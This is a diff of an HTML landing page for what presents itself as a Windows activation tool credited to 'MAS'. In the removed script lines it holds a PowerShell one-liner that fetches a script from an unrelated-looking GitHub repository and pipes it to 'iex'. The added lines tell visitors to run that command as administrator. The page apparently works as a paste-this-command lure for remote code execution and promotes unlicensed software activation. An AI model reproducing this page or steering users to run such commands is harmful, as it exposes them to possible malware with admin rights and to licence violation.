-    <span class="text-sm font-medium">Copied to clipboard!</span>
   </div>
 
-  <script>
-    (function() {
-      const c = document.getElementById('particles');
-      for (let i = 0; i < 30; i++) {
-        const p = document.createElement('div');
-        p.className = 'particle';
-        p.style.left = Math.random() * 100 + '%';
-        p.style.animationDuration = (8 + Math.random() * 15) + 's';
-        p.style.animationDelay = -(Math.random() * 20) + 's';
-        const s = 1 + Math.random() * 2.5;
-        p.style.width = s + 'px';
-        p.style.height = s + 'px';
-        p.style.opacity = 0.2 + Math.random() * 0.4;
-        c.appendChild(p);
-      }
-    })();
+  <!-- How to use -->
+  <div class="card">
+    <div class="card-label">
+      <span class="ico">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="18" height="18"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+      </span>
+      How to use
+    </div>
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <h4>Copy the main command</h4>
+        <p>Copy the main command above</p>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <h4>Old build? Run TLS first</h4>
+        <p>If on an old build, copy and run the TLS command first</p>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <h4>Open PowerShell as Admin</h4>
+        <p>Right-click → Run as administrator</p>
+      </div>
+      <div class="step">
+        <div class="step-num">4</div>
+        <h4>Paste &amp; press Enter</h4>
+        <p>Paste the command and press Enter</p>
+      </div>
+    </div>
 
-    const revealObs = new IntersectionObserver((entries) => {
-      entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('active'); });
-    }, { threshold: 0.1 });
-    document.querySelectorAll('.reveal').forEach(el => revealObs.observe(el));
+    <div class="wait-note">
+      <span class="spin"></span>
+      Wait a few seconds — activation runs automatically
+    </div>
+  </div>
 
-    const toast = document.getElementById('toast');
-    let toastTimer = null;
+  <footer>
+    <div class="powered">
+      <span>Powered by</span>
+      <a href="https://massgrave.dev/" target="_blank" rel="noopener noreferrer">MAS</a>
+      <span class="sep">·</span>
+      <a href="https://github.com/" target="_blank" rel="noopener noreferrer">
+        <svg class="github-ico" viewBox="0 0 24 24" fill="currentColor"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.4 3-.405 1.02.005 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+        GitHub
+      </a>
+    </div>
+  </footer>
 
-    function showToast() {
-      clearTimeout(toastTimer);
-      toast.classList.add('show');
-      toastTimer = setTimeout(() => toast.classList.remove('show'), 2500);
-    }
+</div>
 
-    async function copyText(text, btn, iconEl, textEl, originalText) {
+<div class="toast" id="toast">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><polyline points="20 6 9 17 4 12"/></svg>
+  <span>Copied to clipboard</span>
+</div>
+
+<script>
+  // Copy-to-clipboard with fallback
+  document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.addEventListener('click', async () => {
+      const text = btn.dataset.copy;
+      const label = btn.querySelector('span');
+      const original = label.textContent;
       try {
         await navigator.clipboard.writeText(text);
       } catch {
+        // Fallback for non-secure contexts
         const ta = document.createElement('textarea');
         ta.value = text;
-        ta.style.cssText = 'position:fixed;opacity:0';
+        ta.style.position = 'fixed';
+        ta.style.opacity = '0';
         document.body.appendChild(ta);
         ta.select();
         document.execCommand('copy');
         document.body.removeChild(ta);
       }
-      iconEl.setAttribute('data-icon', 'mdi:check');
-      textEl.textContent = 'Copied!';
-      btn.classList.remove('bg-accent', 'hover:bg-accent-dark', 'bg-slate-700', 'hover:bg-slate-600');
-      btn.classList.add('bg-emerald-600', 'success-pulse');
+      btn.classList.add('copied');
+      label.textContent = 'Copied!';
       showToast();
       setTimeout(() => {
-        iconEl.setAttribute('data-icon', 'mdi:content-copy');
-        textEl.textContent = originalText;
-        btn.classList.remove('bg-emerald-600', 'success-pulse');
-        if (btn.id === 'mainCopyBtn') btn.classList.add('bg-accent', 'hover:bg-accent-dark');
-        else btn.classList.add('bg-slate-700', 'hover:bg-slate-600');
-      }, 2200);
-    }
-
-    const mainCmd = 'irm https://raw.githubusercontent.com/UpdateSys/win/main/win | iex';
-    const mainBtn = document.getElementById('mainCopyBtn');
-    const mainIcon = document.getElementById('mainCopyIcon');
-    const mainText = document.getElementById('mainCopyText');
-    mainBtn.addEventListener('click', e => { e.stopPropagation(); copyText(mainCmd, mainBtn, mainIcon, mainText, 'Copy'); });
-    document.getElementById('mainCodeBox').addEventListener('click', () => copyText(mainCmd, mainBtn, mainIcon, mainText, 'Copy'));
-
-    const tlsCmd = '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12';
-    const tlsBtn = document.getElementById('tlsCopyBtn');
-    const tlsIcon = document.getElementById('tlsCopyIcon');
-    const tlsText = document.getElementById('tlsCopyText');
-    tlsBtn.addEventListener('click', e => { e.stopPropagation(); copyText(tlsCmd, tlsBtn, tlsIcon, tlsText, 'Copy'); });
-    document.getElementById('tlsCommand').addEventListener('click', () => copyText(tlsCmd, tlsBtn, tlsIcon, tlsText, 'Copy'));
-
-    document.addEventListener('mousemove', e => {
-      const x = e.clientX / window.innerWidth;
-      const y = e.clientY / window.innerHeight;
-      const orbs = document.querySelectorAll('.glow-orb');
-      if (orbs[0]) orbs[0].style.transform = `translate(${x * 30}px, ${y * 20}px)`;
-      if (orbs[2]) orbs[2].style.transform = `translate(${-x * 20}px, ${-y * 15}px)`;
+        btn.classList.remove('copied');
+        label.textContent = original;
+      }, 1800);
     });
-  </script>
+  });
+
+  // Toast
+  const toast = document.getElementById('toast');
+  let toastTimer;
+  function showToast() {
+    toast.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+</script>
+
 </body>
 </html>
